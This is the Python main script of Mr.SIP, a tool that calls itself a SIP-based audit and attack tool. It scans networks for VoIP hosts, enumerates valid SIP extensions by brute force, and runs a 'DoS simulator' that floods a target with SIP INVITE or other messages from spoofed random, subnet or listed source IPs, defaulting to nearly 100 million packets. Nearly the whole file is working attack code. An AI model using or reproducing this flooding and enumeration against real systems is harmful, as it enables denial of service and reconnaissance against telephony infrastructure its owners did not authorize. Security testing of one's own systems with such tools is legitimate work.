#!/usr/bin/python
# -*- coding: cp1254 -*-

"""_________________________________________
< Mr.SIP: SIP-Based Audit and Attack Tool! >
 -------------------------------------------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||

#####################################################################################################
        ################################   Authors   ################################ 
#####################################################################################################
"""

__author__ = "Melih Tas"
__copyright__ = "CopyRight 2020"
__license__ = "GPL"
__version__ = "1.1.0"
__status__ = "V2"     

"""
#####################################################################################################
        ################################   Importing Packages   ################################ 
#####################################################################################################
"""

import random,string,ipaddress,netifaces,os,socket,logging
from optparse import OptionParser, OptionGroup
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import conf, IP
from utilities import print_green, print_red, warn
import sip_packet, utilities
import pyfiglet
import itertools

"""
#####################################################################################################
        ################################   Usage Options   ################################ 
#####################################################################################################
"""
usage = "usage: %prog [--ns|--ds|--se] [PARAMETERS]"
parser = OptionParser(usage=usage)# SIP-NES: SIP-based Network Scanner 


NES_HELP = 'SIP-NES is a network scanner. It needs the IP range or IP subnet information as input. It sends SIP OPTIONS message to each IP addresses in the subnet/range and according to the responses, it provides the output of the potential SIP clients and servers on that subnet.'
ENUM_HELP = 'SIP-ENUM is an enumerator. It needs the output of SIP-NES and also pre-defined SIP usernames. It generates SIP REGISTER messages and sends them to all SIP components and tries to find the valid SIP users on the target network. You can write the output in a file.'
DAS_HELP = 'SIP-DAS is a DoS/DDoS attack simulator. It comprises four components: powerful spoofed IP address generator, SIP message generator, message sender and response parser. It needs the outputs of SIP-NES and SIP-ENUM along with some pre-defined files.'

parser.add_option("--nes", "--network-scanner", action="store_true", dest="network_scanner", default=False, help=NES_HELP) # SIP-ENUM: SIP-based Enumerator 
parser.add_option("--enum", "--sip-enumerator", action="store_true", dest="sip_enumerator", default=False, help=ENUM_HELP)# SIP-DAS: SIP-based DoS Attack Simulator 
parser.add_option("--das", "--dos-simulator", action="store_true", dest="dos_simulator", default=False, help=DAS_HELP)


NES_USAGE = """python2 mr.sip.py --nes --tn=<target_IP> --mt=options
python2 mr.sip.py --nes --tn=<target_network_range> --mt=invite
python2 mr.sip.py --nes --tn <target_network_address> --mt=subscribe
"""
ENUM_USAGE = """python2 mr.sip.py --enum --from=from.txt
python2 mr.sip.py --enum --tn=<target_IP> --from=from.txt
"""
DAS_USAGE = """python2 mr.sip.py --das -mt=invite -c <package_count> --tn=<target_IP> -r
python2 mr.sip.py --das --mt=invite -c <package_count> --tn=<target_IP> -s
python2 mr.sip.py --das --mt=invite -c <package_count> --tn=<target_IP> -m --il=ip_list.txt
"""

group_NES_usage = OptionGroup(parser, "SIP-NES Usage", NES_USAGE) # "IP range format: 192.168.1.10-192.168.1.20. Output also written to ip_list.txt."
group_ENUM_usage = OptionGroup(parser, "SIP-ENUM Usage", ENUM_USAGE) # "It reads from ip_list.txt. You can also give the target by using --di=<target_server_IP>."        
group_DAS_usage = OptionGroup(parser, "SIP-DAS Usage", DAS_USAGE) # "-r means random, -s is subnet -m is manual. Default uses scapy library, for socket library, use with -l, however socket library doesn't support IP spoofing."

parser.add_option_group(group_NES_usage)
parser.add_option_group(group_ENUM_usage)
parser.add_option_group(group_DAS_usage)


group = OptionGroup(parser, "Parameters")
group.add_option("--tn", "--target-network", dest="target_network", help="Target network range to scan.")
group.add_option("--mt", "--message-type", dest="message_type", help="Message type selection. OPTIONS, INVITE, REGISTER, SUBSCRIBE, CANCEL, BYE or other custom method.")
group.add_option("--dp", "--destination-port", dest="dest_port", default=5060, help="Destination SIP server port number. Default is 5060.")
group.add_option("--to", "--to-user", dest="to_user", default="toUser.txt", help="To User list file. Default is toUser.txt.")
group.add_option("--from", "--from-user", dest="from_user", default="fromUser.txt", help="From User list file. Default is fromUser.txt.")
group.add_option("--su", "--sp-user", dest="sp_user", default="spUser.txt", help="SP User list file. Default is spUser.txt.")
group.add_option("--ua", "--user-agent", dest="user_agent", default="userAgent.txt", help="User Agent list file. Default is userAgent.txt.")
group.add_option("--il", "--manual-ip-list", dest="manual_ip_list", help="IP list file.")
group.add_option("--if", "--interface", dest="interface", help="Interface to work on.")
group.add_option("--tc", "--thread-count", dest="thread_count", default="10", help="Number of threads running.")
group.add_option("-i", "--ip-save-list", dest="ip_list", default="ip_list.txt", help="Output file to save live IP address.\n Default is inside application folder ip_list.txt.")
group.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
group.add_option("-l", "--lib", action="store_true", dest="library", default=False, help="Use Socket library (no spoofing), default is Scapy")
group.add_option("-r", "--random", action="store_true", dest="random", default=False, help="Spoof IP addresses randomly.")
group.add_option("-m", "--manual", action="store_true", dest="manual", default=False, help="Spoof IP addresses manually. If you choose manually, you have to specify an IP list via --il parameter.")
group.add_option("-s", "--subnet", action="store_true", dest="subnet", default=False, help="Spoof IP addresses from the same subnet.")

parser.add_option_group(group)
    
(options, args) = parser.parse_args()

"""
#####################################################################################################
        ################################   Real Code   ################################ 
#####################################################################################################
"""



import threading
import queue
import time



###########   setting up objects and vars for threading   ##################
threadList = ["thread-" + str(_) for _ in range(int(options.thread_count))]
queueLock = threading.Lock()  # work will be done sorted by hosts
workQueue = queue.Queue()  # create a queue with maximum capacity
threads = []  # threads will be placed here, to close them later
counter = 0
timeToExit = 0



def main():
    
   # ascii_banner = pyfiglet.figlet_format("Mr.SIP: SIP-Based Audit and Attack Tool")
   # print(ascii_banner + "\033[1m\033[91m ~ By Melih Tas (SN)\n\033[0m") 

   banner = """
 __  __      ____ ___ ____      ____ ___ ____       _                        _ 
|  \/  |_ __/ ___|_ _|  _ \ _  / ___|_ _|  _ \     | |__   __ _ ___  ___  __| |
| |\/| | '__\___ \| || |_) (_) \___ \| || |_) |____| '_ \ / _` / __|/ _ \/ _` |
| |  | | | _ ___) | ||  __/ _   ___) | ||  __/_____| |_) | (_| \__ \  __/ (_| |
|_|  |_|_|(_)____/___|_|   (_) |____/___|_|        |_.__/ \__,_|___/\___|\__,_|
                                                                               
    _             _ _ _                     _      _   _   _             _    
   / \  _   _  __| (_) |_    __ _ _ __   __| |    / \ | |_| |_ __ _  ___| | __
  / _ \| | | |/ _` | | __|  / _` | '_ \ / _` |   / _ \| __| __/ _` |/ __| |/ /
 / ___ \ |_| | (_| | | |_  | (_| | | | | (_| |  / ___ \ |_| || (_| | (__|   < 
/_/   \_\__,_|\__,_|_|\__|  \__,_|_| |_|\__,_| /_/   \_\__|\__\__,_|\___|_|\_\\
                                                                              
 _____           _ 
|_   _|__   ___ | |
  | |/ _ \ / _ \| |
  | | (_) | (_) | |
  |_|\___/ \___/|_|+ \033[1m\033[91m ~ By Melih Tas (SN)\n\033[0m
   """ + "Greetz ~ \033[1m\033[94m Caner \033[1m\033[93m Onur \033[1m\033[95m Neslisah \n\033[0m" \
       + "   Maintainer ~ \033[0;32mHakki Riza Kucuk\n\033[0m"
                   
   print (banner)
   if options.interface is not None:
      conf.iface = options.interface

   s = time.time()
   print_time = True


   if options.network_scanner:
      networkScanner()
   elif options.dos_simulator:
      dosSmilator()
   elif options.sip_enumerator:
      sipEnumerator()
   else:
      print("No module is specified.")
      print("If you want you get more out of Mr.SIP, check out PRO version ---> https://mrsip.gitlab.io/ ")
      print_time = False

   if print_time:
      e = time.time()
      print(("time duration: {:.2f}".format(e - s)))


# SIP-NES: SIP-based Network Scanner
def networkScanner():
    value_errors = []
    conf.verb = 0
    global counter

    try: client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
    except ValueError: value_errors.append('Please specify a valid interface name with --if option.')

    message_type = options.message_type.lower() if options.message_type else "options"
    if options.target_network == None: value_errors.append('Please specify a valid target network with --tn option.')
    if 'txt' in options.from_user: from_user = [userName for userName in utilities.readFile(options.from_user).split("\n") if userName.isalnum()]
    else: from_user = [options.from_user]
    if 'txt' in options.to_user: to_user = [userName for userName in utilities.readFile(options.to_user).split("\n") if userName.isalnum()]
    else: to_user = [options.to_user]

    if message_type== 'invite' or message_type == 'options':
        pass # both fromUser and toUser should be accepted.
    elif message_type == 'register' or message_type == 'subscribe':
        to_user = [''] # toUser should be omitted
    
    if 'txt' in options.from_user or '.txt' in options.to_user: 
        print("\033[33m\nYou gave a list of user names ('{}', '{}') for SIP-NES. This is yet an experimental feature. (WIP) \033[0m".format(options.from_user, options.to_user))
        print("\033[33mIf this was not what you wanted, specify user names with '--to' and '--from' arguments \033[0m \n")
    
    utilities.check_value_errors(value_errors)
    
    if "-" in options.target_network:
        host_range = options.target_network.split("-")
        host, last = ipaddress.IPv4Address(unicode(host_range[0])), ipaddress.IPv4Address(unicode(host_range[1]))
        if ipaddress.IPv4Address(host) > ipaddress.IPv4Address(last): value_errors.append("Error: Second IP address ({}) must bigger than first IP address ({}).".format(ipaddress.IPv4Address(host),ipaddress.IPv4Address(last)))
        else:
            target_networks = [utilities.decimal_to_octets(host) for host in range(int(ipaddress.IPv4Address(host)), int(ipaddress.IPv4Address(last) + 1))]
            target_network__fromUser__toUser = [(tn, fu, tu) for tn, fu, tu in itertools.product(target_networks, from_user, to_user)]
    elif "/" in options.target_network:
        target_networks = [host for host in ipaddress.IPv4Network(unicode(options.target_network), strict=False).hosts()]
        target_network__fromUser__toUser = [(tn, fu, tu) for tn, fu, tu in itertools.product(target_networks, from_user, to_user)]
    elif len(from_user) > 1 or len(to_user) > 1:
        print("\033[33mCalculating all permutations of target network ('{}'), from user name list ('{}') and to user name list ('{}').\033[0m".format(options.target_network, options.from_user, options.to_user))
        print("\033[33mDepending on the list sizes, this might take a long time.\033[0m \n")
        target_network__fromUser__toUser = [(tn, fu, tu) for tn, fu, tu in itertools.product([options.target_network], from_user, to_user)]

    utilities.check_value_errors(value_errors)
    utilities.printInital("Network scan :", conf.iface, client_ip)
    
    thread_join_time = 0.01
    if '-' in options.target_network or '/' in options.target_network or (len(from_user) > 1 or len(to_user) > 1):  # Create new threads
        run_event = threading.Event()
        for _ in threadList:
            thread = threading.Thread(target=sipnes_worker, args=(run_event, message_type, options.dest_port, client_ip))
            thread.daemon = True
            threads.append(thread)

        _prompt_new = "\33[38;5;6m{} User names (to and from) will be checked for {} target networks.\nThere will be {} packages generated. Do you want to continue? (y/n)\33[0m\n"
        try:
            continue_flag = raw_input(_prompt_new.format(len(from_user) + len(to_user), len(target_networks), len(target_network__fromUser__toUser)))
        except EOFError:
            print("STDIN is unavailable. Accepting answer as yes.")
            continue_flag = 'y'
        if continue_flag == 'n':
            print("\33[38;5;6mTerminating by user input\33[0m")
            run_event.clear()
            exit(0)
        elif continue_flag != 'y' and continue_flag != 'n':
            print("\33[38;5;6mAnswer not understood. Please answer y/n.\33[0m")
            run_event.clear()
            exit(0)
            
        for tn_fu_tu in target_network__fromUser__toUser: workQueue.put(tn_fu_tu) 
        for thread in threads: thread.start()
        try:
            while not workQueue.empty(): pass
        except KeyboardInterrupt:
            print("\nCTRL+C pressed, terminating SIP-NES gracefully")
        run_event.set()
        run_event.clear()
        try:
            for t in threads: t.join(thread_join_time)
        except KeyboardInterrupt:
            print("\nCTRL+C pressed, but Mr. SIP is already trying to terminate SIP-NES gracefully. Please be patient.")
            for t in threads: t.join(thread_join_time)  # call the threads, finish
    else:
        if len(from_user) == 1 and len(to_user) == 1:
            host = options.target_network
            sip = sip_packet.sip_packet(message_type, host, options.dest_port, client_ip, from_user=from_user[0], to_user=to_user[0], protocol="socket", wait=True)
            result = sip.generate_packet()

            if result["status"]: # and result["response"]['code'] == 200:
                utilities.printResult(result, host, options.ip_list)
                counter += 1

    print(("\033[31m[!] Network scan process finished and {0} live IP address(s) found.\033[0m".format(str(counter))))


# SIP-ENUM: SIP-based Enumerator 
def sipEnumerator():
    value_errors = []
    conf.verb = 0

    try: client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
    except ValueError: value_errors.append('Please specify a valid interface name with --if option.')
    
    message_type = options.message_type.lower() if options.message_type else "subscribe"

    user_list = [userName for userName in utilities.readFile(options.from_user).split("\n") if userName.isalnum()]
    if len(user_list) <= 1: value_errors.append("Error: From user not found. Please enter a valid From User list.")

    if options.target_network: target_networks = [options.target_network]
    else:
        content = utilities.readFile("ip_list.txt").split(";")
        if len(content[0]) <= 1: value_errors.append("Error: Target IP not found. Please run SIP-NES first for detect the target IPs.")
        with open('ip_list.txt', 'r') as f: target_networks = [line.split(';')[0] for line in f.readlines()]

    utilities.check_value_errors(value_errors)
    utilities.printInital("Enumeration", conf.iface, client_ip)
    
    # combination of all target_networks with user_IDs
    target_network__user_id = [(target_network, user_id) for target_network, user_id in itertools.product(target_networks, user_list)]

    global counter
    global workQueue
    run_event = threading.Event()
    thread_join_time = 0.001
    print("running with {} threads".format(len(threadList)))
    for _ in threadList:
        thread = threading.Thread(target=sipenum_worker, args=(run_event, message_type, options.dest_port, client_ip))
        thread.daemon = True
        threads.append(thread)

    _prompt_new = "\33[38;5;6m{} user IDs will be checked for {} target networks.\nThere will be {} packages generated. Do you want to continue? (y/n)\33[0m\n"
    try:
        continue_flag = raw_input(_prompt_new.format(len(user_list), len(target_networks), len(target_network__user_id)))
    except EOFError:
        print("STDIN is unavailable. Accepting answer as yes.")
        continue_flag = 'y'

    if continue_flag == 'y':
        for tn_ui in target_network__user_id: workQueue.put(tn_ui)
        for thread in threads: thread.start()  # invoke the 'run()' function in the class
        try: 
            while not workQueue.empty(): pass  # Wait for queue to empty<
        except KeyboardInterrupt: print("\nCTRL+C pressed, terminating SIP-ENUM gracefully")
        run_event.set()
        run_event.clear()
        try:
            for t in threads: t.join(thread_join_time)
        except KeyboardInterrupt:
            print("\nCTRL+C pressed, but Mr. SIP is already trying to terminate SIP-ENUM gracefully. Please be patient.")
            for t in threads: t.join(thread_join_time)  # call the threads, finish
    elif continue_flag == 'n':
        print("\33[38;5;6mTerminating by user input\33[0m")
        run_event.set()
        run_event.clear()
        exit(0)
    else:
        print("\33[38;5;6mAnswer not understood. Please answer y/n.\33[0m")
        run_event.set()
        run_event.clear()
        exit(0)

    print(("[!] " + str(counter) + " SIP Extension Found."))


# SIP-DAS: SIP-based DoS Attack Simulator
def dosSmilator():
    value_errors = []
    conf.verb = 0

    try: 
        client_ip = netifaces.ifaddresses(conf.iface)[2][0]['addr']
        client_netmask = netifaces.ifaddresses(conf.iface)[2][0]['netmask']
    except ValueError: value_errors.append('Please specify a valid interface name with --if option.')
    message_type = options.message_type.lower() if options.message_type else "invite"
    
    utilities.check_value_errors(value_errors)
    utilities.promisc("on", conf.iface)
    utilities.printInital("DoS attack simulation", conf.iface, client_ip)

    i = 0
    while i < int(options.counter):
        try:
            toUser = random.choice([line.rstrip('\n') for line in open(options.to_user)])
            fromUser = random.choice([line.rstrip('\n') for line in open(options.from_user)])
            spUser = random.choice([line.rstrip('\n') for line in open(options.sp_user)])
            userAgent = random.choice([line.rstrip('\n') for line in open(options.user_agent)])

            pkt = IP(dst=options.target_network)
            client = pkt.src

            if options.random and not options.library:
                client = utilities.randomIPAddress()
            if options.manual and not options.library:
                client = random.choice([line.rstrip('\n') for line in open(options.manual_ip_list)])
            if options.subnet and not options.library:
                client = utilities.randomIPAddressFromNetwork(client_ip, client_netmask, False)
            send_protocol = "scapy"
            if options.library:
                send_protocol = "socket"

            sip = sip_packet.sip_packet(str(message_type), str(options.target_network), str(options.dest_port),
                                        str(client), str(fromUser), str(toUser), str(userAgent), str(spUser),
                                        send_protocol)
            sip.generate_packet()
            i += 1
            utilities.printProgressBar(i, int(options.counter), "Progress: ")
        except (KeyboardInterrupt):
            utilities.promisc("off", conf.iface)
            print("Exiting traffic generation...")
            raise SystemExit

    print(("\033[31m[!] DoS simulation finished and {0} packet sent to {1}...\033[0m".format(str(i), str(
        options.target_network))))
    utilities.promisc("off", conf.iface)


# module functions for parallel computing...
def sipnes_worker(run_event, option, dest_port, client_ip):
    while not run_event.is_set():
        global counter  # notice how we use 'global' counter
        global workQueue
        host, from_user, to_user = workQueue.get()  # get host
        sip = sip_packet.sip_packet(option, host, dest_port, client_ip, from_user=from_user, to_user=to_user, protocol="socket", wait=True)  # set options
        result = sip.generate_packet()  # generate packet.
        if result["status"]:
            utilities.printResult(result, str(host), options.ip_list)
            counter += 1  # global counter changed


def sipenum_worker(run_event, option, dest_port, client_ip):
    while not run_event.is_set():
        global counter  # notice how we use 'global' counter
        global workQueue

        if workQueue.empty(): break

        tn_ui = workQueue.get()  # get host
        target_network, user_id = tn_ui[0], tn_ui[1]
        sip = sip_packet.sip_packet(option, target_network, dest_port, client_ip, from_user=user_id.strip(), to_user=user_id.strip(), protocol="socket", wait=True)
        result = sip.generate_packet()
        if result["status"]:
            if not len(result["response"]):
                print(("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id)))
                counter += 1
            elif result["response"]['code'] == 200:
                print(("\033[1;32m[+] New SIP extension found in {}: {},\033[0m \033[1;31mAuthentication not required!\033[0m".format(target_network, user_id)))
                counter += 1
            elif result["response"]['code'] == 401:
                print(("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id)))
                counter += 1
            elif result["response"]['code'] == 403:
                print(("\033[1;32m[+] New SIP extension found in {}: {}, Authentication required.\033[0m".format(target_network, user_id)))
                counter += 1



if __name__ == "__main__":
   main()
    
